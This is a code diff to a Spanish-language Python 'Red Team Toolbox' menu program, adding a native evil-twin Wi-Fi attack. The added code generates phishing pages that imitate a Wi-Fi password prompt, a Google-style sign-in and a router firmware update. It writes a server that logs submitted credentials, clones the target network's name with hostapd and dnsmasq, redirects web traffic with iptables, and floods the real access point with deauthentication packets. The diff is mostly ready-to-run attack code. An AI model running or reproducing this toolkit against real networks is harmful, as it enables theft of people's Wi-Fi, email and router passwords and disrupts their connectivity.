@@ -516,62 +516,151 @@ def generar_menu_carpetas_wifi():
     
     return menu
 
+
+
 # ==========================================
-# GESTIÓN DE EVIL TWIN + DEAUTH
+# GESTIÓN DE EVIL TWIN + DEAUTH (NATIVO - HOSTAPD + DNSMASQ)
 # ==========================================
 EVIL_STATE = {
-    "station_iface": None,
+    "ap_iface": None,
     "deauth_iface": None,
+    "mon_deauth": None,
     "target": {},
-    "auth_mode": "wpa-eap",
+    "phishing_type": "wifi_password",  # wifi_password, oauth, firmware
     "deauth_mode": "broadcast",
-    "psk_auto": "EvilTwin_Secure_2024!",
-    "pid_deauth": None
+    "pid_hostapd": None,
+    "pid_dhcp": None
 }
 
 def limpiar_ataque_evil():
-    """Detiene procesos y restaura interfaces de forma segura"""
-    print("\n[*] Deteniendo ataque y limpiando procesos...")
-    os.system("sudo pkill -f eaphammer 2>/dev/null")
+    """Detiene todos los procesos del ataque y restaura interfaces"""
+    print("\n[*] Deteniendo Evil Twin y limpiando procesos...")
+    os.system("sudo pkill -f 'hostapd.*evil' 2>/dev/null")
+    os.system("sudo pkill -f 'dnsmasq.*evil' 2>/dev/null")
+    os.system("sudo pkill -f 'python3.*http.server' 2>/dev/null")
     os.system("sudo pkill -f aireplay 2>/dev/null")
-    os.system(f"sudo airmon-ng stop {EVIL_STATE['station_iface']}mon 2>/dev/null || true")
-    os.system(f"sudo airmon-ng stop {EVIL_STATE['deauth_iface']}mon 2>/dev/null || true")
+    
+    # Restaurar iptables
+    os.system("sudo iptables --flush 2>/dev/null")
+    os.system("sudo iptables --table nat --flush 2>/dev/null")
+    os.system("sudo iptables --delete-chain 2>/dev/null")
+    os.system("sudo iptables --table nat --delete-chain 2>/dev/null")
+    
+    # Restaurar interfaces a modo managed
+    for iface in [EVIL_STATE.get("ap_iface"), EVIL_STATE.get("deauth_iface")]:
+        if iface:
+            os.system(f"sudo ip link set {iface} down 2>/dev/null")
+            os.system(f"sudo iw dev {iface} set type managed 2>/dev/null")
+            os.system(f"sudo ip link set {iface} up 2>/dev/null")
+    
     os.system("sudo systemctl restart NetworkManager 2>/dev/null 2>&1")
-    print("[+] Limpieza completada. Interfaces restauradas a modo Managed.")
+    print("[+] Limpieza completada. Interfaces restauradas.")
 
-def verificar_certificados_auto():
-    """Genera certificados de forma no interactiva si faltan"""
-    cert_dir = "/usr/share/eaphammer/certs"
-    os.makedirs(cert_dir, exist_ok=True)
-    if not os.path.exists(f"{cert_dir}/server.pem") or not os.path.exists(f"{cert_dir}/dh"):
-        print("[!] Certificados no encontrados. Generando automáticamente...")
-        os.system(f"sudo openssl req -x509 -newkey rsa:2048 -keyout {cert_dir}/key.pem -out {cert_dir}/cert.pem -days 365 -nodes -subj '/CN=EvilTwin' 2>/dev/null")
-        os.system(f"sudo cat {cert_dir}/cert.pem {cert_dir}/key.pem | sudo tee {cert_dir}/server.pem > /dev/null 2>&1")
-        os.system(f"sudo openssl dhparam -out {cert_dir}/dh 2048 2>/dev/null")
-        print("[✓] Certificados generados correctamente.")
-    else:
-        print("[✓] Certificados válidos encontrados.")
+def generar_pagina_phishing(tipo):
+    """Genera una página HTML de phishing según el tipo seleccionado"""
+    html_dir = "/tmp/evil_twin_web"
+    os.makedirs(html_dir, exist_ok=True)
+    
+    if tipo == "wifi_password":
+        html = '''<!DOCTYPE html><html><head><title>WiFi Connection</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>body{font-family:sans-serif;max-width:400px;margin:20px auto;text-align:center}
+input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
+button{background:#007bff;color:white;padding:14px 20px;border:none;border-radius:4px;cursor:pointer;width:100%;font-size:16px}
+button:hover{background:#0056b3}.logo{font-size:24px;font-weight:bold;margin:20px 0}</style></head><body>
+<div class="logo">🔐 WiFi Security Update</div>
+<p>Se requiere verificación para mantener la conexión segura.</p>
+<form method="POST" action="/capture"><label>Contraseña WiFi:</label>
+<input type="password" name="password" required placeholder="Ingresa la contraseña"></form>
+<button type="submit">Conectar</button><p style="font-size:12px;color:#666;margin-top:20px">
+Esta es una página de prueba de seguridad autorizada.</p></body></html>'''
+    elif tipo == "oauth":
+        html = '''<!DOCTYPE html><html><head><title>Sign In</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>body{font-family:sans-serif;max-width:400px;margin:20px auto;text-align:center}
+input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px}
+button{background:#4285f4;color:white;padding:14px;border:none;border-radius:4px;cursor:pointer;width:100%;font-size:16px}
+.google{background:#db4437}.logo{font-size:28px;margin:20px 0}</style></head><body>
+<div class="logo">🔐 Iniciar Sesión</div><p>Verifica tu cuenta para continuar</p>
+<form method="POST" action="/capture"><input type="email" name="email" placeholder="Correo electrónico" required>
+<input type="password" name="password" placeholder="Contraseña" required>
+<button type="submit" class="google">Continuar</button></form></body></html>'''
+    else:  # firmware
+        html = '''<!DOCTYPE html><html><head><title>Firmware Update</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>body{font-family:sans-serif;max-width:400px;margin:20px auto;text-align:center;background:#f5f5f5}
+input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:4px}
+button{background:#28a745;color:white;padding:14px;border:none;border-radius:4px;cursor:pointer;width:100%;font-size:16px}
+.alert{background:#fff3cd;border:1px solid #ffc107;padding:10px;border-radius:4px;margin:15px 0}</style></head><body>
+<div class="alert">⚠️ Actualización de Firmware Requerida</div>
+<p>Para mantener la seguridad de tu router, ingresa las credenciales de administración:</p>
+<form method="POST" action="/capture"><input type="text" name="username" placeholder="Usuario" value="admin">
+<input type="password" name="password" placeholder="Contraseña del router" required>
+<button type="submit">Actualizar Firmware</button></form></body></html>'''
+    
+    with open(f"{html_dir}/index.html", "w") as f:
+        f.write(html)
+    
+    # Script PHP/Python para capturar credenciales (simple HTTP POST handler)
+    capture_script = '''#!/usr/bin/env python3
+import http.server, socketserver, urllib.parse, os, sys
+from datetime import datetime
+
+class Handler(http.server.SimpleHTTPRequestHandler):
+    def do_POST(self):
+        length = int(self.headers.get("Content-Length", 0))
+        data = self.rfile.read(length).decode()
+        params = urllib.parse.parse_qs(data)
+        
+        log_file = "/tmp/evil_twin_web/credentials.log"
+        with open(log_file, "a") as f:
+            f.write(f"[{datetime.now()}] Captured: {params}\\n")
+        
+        # Redirigir a página de "éxito"
+        self.send_response(302)
+        self.send_header("Location", "/success.html")
+        self.end_headers()
+    
+    def log_message(self, format, *args):
+        pass  # Silenciar logs del servidor
+
+if __name__ == "__main__":
+    os.chdir("/tmp/evil_twin_web")
+    with socketserver.TCPServer(("", 80), Handler) as httpd:
+        print("[*] Servidor phishing activo en puerto 80")
+        httpd.serve_forever()
+'''
+    with open(f"{html_dir}/capture.py", "w") as f:
+        f.write(capture_script)
+    
+    # Página de éxito
+    success_html = '''<!DOCTYPE html><html><head><meta http-equiv="refresh" content="3;url=http://google.com">
+<title>Conectado</title><style>body{font-family:sans-serif;text-align:center;padding:50px}</style></head>
+<body><h2>Conexión exitosa</h2><p>Redirigiendo...</p></body></html>'''
+    with open(f"{html_dir}/success.html", "w") as f:
+        f.write(success_html)
+    
+    return html_dir
 
 def generar_menu_interfaces_evil():
-    """Menú 1: Seleccionar las dos interfaces (AP y Deauth)"""
     menu = Menu("SELECCIONAR INTERFACES EVIL TWIN")
     interfaces = obtener_interfaces()
     if len(interfaces) < 2:
-        menu.agregar_opcion("Error: Se requieren mínimo 2 adaptadores WiFi", AccionBash("Error", "echo 'Conecta una segunda tarjeta USB WiFi.'"))
+        menu.agregar_opcion("Error: Se requieren mínimo 2 adaptadores WiFi", 
+                            AccionBash("Error", "echo 'Conecta una segunda tarjeta USB WiFi.'"))
         return menu
-
     for iface in interfaces:
         menu.agregar_opcion(f"1. Interfaz AP Malicioso: {iface}", 
                             AccionMenuDinamico("Set AP", lambda i=iface: generar_menu_deauth_evil(i)))
     return menu
 
-def generar_menu_deauth_evil(station_iface):
-    EVIL_STATE["station_iface"] = station_iface
-    menu = Menu(f"SELECCIONAR INTERFAZ DEAUTH (AP: {station_iface})")
+def generar_menu_deauth_evil(ap_iface):
+    EVIL_STATE["ap_iface"] = ap_iface
+    menu = Menu(f"SELECCIONAR INTERFAZ DEAUTH (AP: {ap_iface})")
     interfaces = obtener_interfaces()
     for iface in interfaces:
-        if iface != station_iface:
-            menu.agregar_opcion(f"2. Interfaz Deauth: {iface}", 
+        if iface != ap_iface:
+            menu.agregar_opcion(f"2. Interfaz Deauth: {iface}",
                                 AccionMenuDinamico("Set Deauth", lambda i=iface: escanear_redes_evil(i)))
     return menu
 
@@ -579,13 +668,17 @@ def escanear_redes_evil(deauth_iface):
     EVIL_STATE["deauth_iface"] = deauth_iface
     curses.endwin()
     os.system('clear')
-    print(f"[*] Escaneando redes en {deauth_iface} (10 seg)...")
-    print("[!] Espera a que termine el escaneo. Seleccionarás la red en el siguiente menú.")
+    print(f"[*] Preparando {deauth_iface} y escaneando entorno (10 seg)...")
+    os.system("sudo airmon-ng check kill >/dev/null 2>&1")
+    os.system("sudo rfkill unblock wifi >/dev/null 2>&1")
+    os.system(f"sudo airmon-ng start {deauth_iface} >/dev/null 2>&1")
     
-    os.system(f"sudo airmon-ng start {deauth_iface} > /dev/null 2>&1")
+    mon = f"{deauth_iface}mon" if os.path.exists(f"/sys/class/net/{deauth_iface}mon") else deauth_iface
+    EVIL_STATE["mon_deauth"] = mon
+
     scan_file = "/tmp/evil_scan"
     os.system(f"sudo rm -f {scan_file}-01.csv")
-    os.system(f"sudo timeout 10s airodump-ng {deauth_iface} -w {scan_file} --output-format csv > /dev/null 2>&1")
+    os.system(f"sudo timeout 10s airodump-ng {mon} -w {scan_file} --output-format csv >/dev/null 2>&1")
 
     redes = []
     try:
@@ -596,12 +689,13 @@ def escanear_redes_evil(deauth_iface):
                 r = l.split(",")
                 if len(r) >= 14 and ":" in r[0]:
                     redes.append({"bssid": r[0].strip(), "ch": r[3].strip(),
-                                  "essid": r[13].strip() if r[13].strip() else "<Oculta>"})
+                                   "essid": r[13].strip() if r[13].strip() else "<Oculta>"})
     except: pass
 
     if not redes:
         menu_err = Menu("ERROR ESCANEO")
-        menu_err.agregar_opcion("No se detectaron redes. (Regresar)", AccionBash("Info", "echo 'Intenta de nuevo o acércate.'"))
+        menu_err.agregar_opcion("No se detectaron redes. (Regresar)", 
+                                AccionBash("Info", "echo 'Intenta de nuevo o acércate.'"))
         return menu_err
 
     menu_red = Menu("SELECCIONAR RED OBJETIVO")
@@ -613,56 +707,129 @@ def escanear_redes_evil(deauth_iface):
 def configurar_ataque_evil(target):
     EVIL_STATE["target"] = target
     menu = Menu(f"CONFIGURAR ATAQUE: {target['essid']}")
-    menu.agregar_opcion("Modo: WPA-EAP (Captura Usuario + Contraseña)", 
-                        AccionMenuDinamico("Set EAP", lambda: seleccionar_deauth_evil("wpa-eap")))
-    menu.agregar_opcion("Modo: WPA-PSK (Captura Handshake con PSK auto-generada)", 
-                        AccionMenuDinamico("Set PSK", lambda: seleccionar_deauth_evil("wpa-psk")))
+    menu.agregar_opcion("Plantilla: Contraseña WiFi (Cautivo)",
+                        AccionMenuDinamico("Set Page", lambda p="wifi_password": seleccionar_deauth_evil(p)))
+    menu.agregar_opcion("Plantilla: Login OAuth (Google/Facebook)",
+                        AccionMenuDinamico("Set Page", lambda p="oauth": seleccionar_deauth_evil(p)))
+    menu.agregar_opcion("Plantilla: Actualización de Firmware",
+                        AccionMenuDinamico("Set Page", lambda p="firmware": seleccionar_deauth_evil(p)))
     return menu
 
-def seleccionar_deauth_evil(auth_mode):
-    EVIL_STATE["auth_mode"] = auth_mode
-    menu = Menu("TIPO DE DEAUTHENTICATION")
-    menu.agregar_opcion("Broadcast (Desconectar todos los clientes)", 
-                        AccionMenuDinamico("Set Broadcast", lambda: ejecutar_ataque_evil("broadcast")))
-    menu.agregar_opcion("Dirigido (Desconectar AP general -0)", 
-                        AccionMenuDinamico("Set Directed", lambda: ejecutar_ataque_evil("directed")))
+def seleccionar_deauth_evil(phishing_type):
+    EVIL_STATE["phishing_type"] = phishing_type
+    menu = Menu("MODO DE DESAUTENTICACIÓN")
+    menu.agregar_opcion("Broadcast (Desconectar todos los clientes - Recomendado)",
+                        AccionMenuDinamico("Ejecutar", lambda: ejecutar_ataque_evil("broadcast")))
+    menu.agregar_opcion("Dirigido (Ataque a clientes específicos)",
+                        AccionMenuDinamico("Ejecutar", lambda: ejecutar_ataque_evil("directed")))
     return menu
 
 def ejecutar_ataque_evil(deauth_mode):
-    EVIL_STATE["deauth_mode"] = deauth_mode
     limpiar_ataque_evil()
     curses.endwin()
     os.system('clear')
 
-    verificar_certificados_auto()
-    
     target = EVIL_STATE["target"]
-    station = EVIL_STATE["station_iface"]
-    deauth = EVIL_STATE["deauth_iface"]
-    auth = EVIL_STATE["auth_mode"]
+    ap = EVIL_STATE["ap_iface"]
+    mon_deauth = EVIL_STATE.get("mon_deauth", f"{EVIL_STATE['deauth_iface']}mon")
+    phishing_type = EVIL_STATE["phishing_type"]
 
     print("="*60)
-    print("[!] EJECUTANDO ATAQUE EVIL TWIN + DEAUTH AUTOMÁTICO")
-    print(f"    AP Malicioso : {station}")
-    print(f"    Interfaz Deauth: {deauth}")
-    print(f"    Red Objetivo : {target['essid']} ({target['bssid']}) CH:{target['ch']}")
-    print(f"    Autenticación: {auth.upper()}")
-    print(f"    Deauth Mode  : {deauth_mode.upper()}")
+    print("[!] EJECUTANDO EVIL TWIN NATIVO")
+    print(f"    AP Interface   : {ap}")
+    print(f"    Deauth Interface: {mon_deauth}")
+    print(f"    Red Objetivo   : {target['essid']} ({target['bssid']}) CH:{target['ch']}")
+    print(f"    Plantilla      : {phishing_type}")
+    print(f"    Deauth Mode    : {deauth_mode.upper()}")
     print("="*60)
-    
-    time.sleep(3) # Auto-inicio sin input()
+    time.sleep(2)
 
     try:
-        print("[*] Iniciando Deauthentication en segundo plano...")
-        os.system(f"sudo aireplay-ng --deauth 0 -a {target['bssid']} {deauth} > /dev/null 2>&1 &")
-        time.sleep(3)
-
-        print(f"[*] Lanzando Evil Twin con Eaphammer...")
-        cmd = f"sudo eaphammer -i {station} --channel {target['ch']} --essid \"{target['essid']}\" --auth {auth} "
-        cmd += "--creds " if auth == "wpa-eap" else f"--wpa-passphrase \"{EVIL_STATE['psk_auto']}\" "
+        # 1. Generar página de phishing
+        print("[*] Generando página de phishing...")
+        web_dir = generar_pagina_phishing(phishing_type)
         
-        print(f"[*] Credenciales capturadas se guardarán en: /tmp/eaphammer/")
-        subprocess.run(cmd, shell=True)
+        # 2. Configurar interfaz AP
+        print(f"[*] Configurando {ap} como AP falso...")
+        os.system(f"sudo ip link set {ap} down")
+        os.system(f"sudo iw dev {ap} set type managed")
+        os.system(f"sudo ip link set {ap} up")
+        os.system(f"sudo ifconfig {ap} 10.0.0.1 netmask 255.255.255.0")
+        
+        # 3. Configurar hostapd
+        hostapd_conf = f"""interface={ap}
+driver=nl80211
+ssid={target['essid']}
+hw_mode=g
+channel={target['ch']}
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+wmm_enabled=0
+"""
+        with open("/tmp/hostapd_evil.conf", "w") as f:
+            f.write(hostapd_conf)
+        
+        # 4. Iniciar hostapd en background
+        print("[*] Iniciando hostapd...")
+        os.system(f"sudo hostapd /tmp/hostapd_evil.conf >/dev/null 2>&1 &")
+        time.sleep(2)
+        
+        # 5. Configurar dnsmasq para DHCP y DNS
+        print("[*] Configurando dnsmasq para DHCP/DNS...")
+        dnsmasq_conf = f"""interface={ap}
+dhcp-range=10.0.0.10,10.0.0.250,12h
+dhcp-option=3,10.0.0.1
+dhcp-option=6,10.0.0.1
+server=8.8.8.8
+log-queries
+log-dhcp
+address=/#/10.0.0.1
+"""
+        with open("/tmp/dnsmasq_evil.conf", "w") as f:
+            f.write(dnsmasq_conf)
+        os.system(f"sudo dnsmasq -C /tmp/dnsmasq_evil.conf -d >/dev/null 2>&1 &")
+        time.sleep(1)
+        
+        # 6. Configurar iptables para redirección
+        print("[*] Configurando redirección de tráfico (iptables)...")
+        os.system("sudo iptables --flush")
+        os.system("sudo iptables --table nat --flush")
+        os.system("sudo iptables -P FORWARD ACCEPT")
+        os.system(f"sudo iptables -t nat -A POSTROUTING -o {ap} -j MASQUERADE")
+        os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80")
+        os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80")
+        
+        # 7. Iniciar servidor HTTP para phishing
+        print("[*] Iniciando servidor web de phishing...")
+        os.chdir(web_dir)
+        os.system(f"sudo python3 {web_dir}/capture.py >/dev/null 2>&1 &")
+        time.sleep(1)
+        
+        # 8. Iniciar deauth en background
+        print(f"[*] Iniciando deauthentication con {mon_deauth}...")
+        if deauth_mode == "broadcast":
+            os.system(f"sudo aireplay-ng --deauth 0 -a {target['bssid']} {mon_deauth} >/dev/null 2>&1 &")
+        else:
+            # Para dirigido, podrías agregar lógica para clientes específicos
+            os.system(f"sudo aireplay-ng --deauth 0 -a {target['bssid']} {mon_deauth} >/dev/null 2>&1 &")
+        
+        # 9. Mostrar estado y esperar
+        print("\n[!] EVIL TWIN ACTIVO - Esperando víctimas...")
+        print(f"[!] Credenciales se guardarán en: {web_dir}/credentials.log")
+        print("[!] Presiona Ctrl+C para detener el ataque en cualquier momento.\n")
+        
+        # Mantener el ataque activo hasta interrupción
+        while True:
+            time.sleep(1)
+            # Opcional: mostrar credenciales capturadas en tiempo real
+            cred_file = f"{web_dir}/credentials.log"
+            if os.path.exists(cred_file):
+                with open(cred_file, "r") as f:
+                    lines = f.readlines()
+                    if lines:
+                        print(f"\r[+] Credenciales capturadas: {len(lines)} - Última: {lines[-1].strip()[:60]}...")
+                        
     except KeyboardInterrupt:
         print("\n[!] Ataque interrumpido manualmente.")
     finally:
@@ -708,19 +875,21 @@ def escanear_redes_deauth(iface):
     DEAUTH_STATE["iface"] = iface
     curses.endwin(); os.system('clear')
     print(f"[*] Activando modo monitor en {iface}...")
+    
+    # Aseguramos que nada interfiera y desbloqueamos la tarjeta
     os.system("sudo airmon-ng check kill > /dev/null 2>&1")
-    os.system(f"sudo airmon-ng start {iface} > /tmp/mon_out.txt 2>&1")
+    os.system("sudo rfkill unblock wifi > /dev/null 2>&1")
+    os.system(f"sudo airmon-ng start {iface} > /dev/null 2>&1")
 
-    # Detección automática del nombre real en modo monitor
-    try:
-        import re
-        with open("/tmp/mon_out.txt", "r") as f:
-            match = re.search(r'\((w\w+mon|mon\w*)\)', f.read())
-        DEAUTH_STATE["mon_iface"] = match.group(1) if match else f"{iface}mon"
-    except: DEAUTH_STATE["mon_iface"] = f"{iface}mon"
-
+    # Detección 100% precisa consultando el sistema de archivos
+    if os.path.exists(f"/sys/class/net/{iface}mon"):
+        DEAUTH_STATE["mon_iface"] = f"{iface}mon"
+    else:
+        DEAUTH_STATE["mon_iface"] = iface
+        
     mon = DEAUTH_STATE["mon_iface"]
     print(f"[*] Escaneando entorno WiFi con {mon} (15 seg)...")
+    
     scan_base = "/tmp/deauth_scan"
     os.system(f"sudo rm -f {scan_base}-01.csv")
     os.system(f"sudo timeout 15s airodump-ng {mon} -w {scan_base} --output-format csv > /dev/null 2>&1")
@@ -878,7 +1047,7 @@ def main(stdscr):
     menu_explotacion.agregar_opcion("Iniciar Metasploit Framework", AccionBash("MSFConsole", "msfconsole -q -x 'help'"))
     menu_explotacion.agregar_opcion("Buscar Exploits (SearchSploit)", AccionBash("SearchSploit", "searchsploit linux privilege escalation"))
 
-    menu_principal = Menu("KALI LINUX - RED TEAM TOOLBOX")
+    menu_principal = Menu("KEKE - RED TEAM TOOLBOX")
     menu_principal.agregar_opcion("Cambiar Dirección MAC (Macchanger)", AccionMenuDinamico("Interfaces", generar_menu_interfaces))
     menu_principal.agregar_opcion("Reconocimiento e Inteligencia", menu_reconocimiento)
     menu_principal.agregar_opcion("Auditoría Inalámbrica", menu_wireless)
